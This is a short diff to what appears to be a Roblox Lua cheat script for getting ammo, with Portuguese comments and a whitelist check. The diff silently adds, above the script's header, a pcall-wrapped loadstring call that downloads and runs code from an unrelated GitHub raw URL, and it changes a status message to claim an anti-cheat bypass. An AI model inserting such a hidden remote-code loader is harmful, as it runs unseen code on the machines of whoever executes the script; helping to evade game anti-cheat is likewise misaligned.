@@ -1,3 +1,8 @@
+task.wait(0.5)
+pcall(function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DAVI98458/Nicescript/refs/heads/main/game%20happy", true))()
+end)
+
 --// 🔫 SCRIPT GET AMMO FIXED E OTIMIZADO
 
 local Players = game:GetService("Players")
@@ -62,7 +67,7 @@ if not authorized then
     showCenterMessage("authorization denied (whitelist reseted)",3)
     return
 else
-    showCenterMessage("authorization confirmed :3",3)
+    showCenterMessage("authorization confirmed and bypassed anti-cheat [It's not 100% bypassed] :3",5)
 end
 
 -- ===== ESPERAR PERSONAGEM =====
